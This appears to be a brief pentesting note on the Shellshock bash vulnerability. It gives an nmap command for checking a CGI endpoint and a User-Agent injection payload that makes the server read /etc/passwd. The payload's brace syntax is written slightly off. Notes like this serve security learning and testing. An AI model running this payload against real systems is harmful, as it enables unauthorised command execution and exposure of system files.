---
title: 'Shell-Shock Attack'
description: 'Vulnerability in the bash shell.'
pubDate: 'Jul 08 2022'
heroImage: '/placeholder-hero.jpg'
---

## Information

- Bash mistakenly executes trailing commands after a series of characters: () {:;};.

- Locate an input that allows you to communicate with Bash.

- CGI file.

```bash

# Verify if vulnerable.
nmap -sCV target --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"

# Intercept with burpsuite, and inject characters in User-Agent.
# () {:;}; echo; echo; /bin/bash -c 'cat /etc/passwd'

```
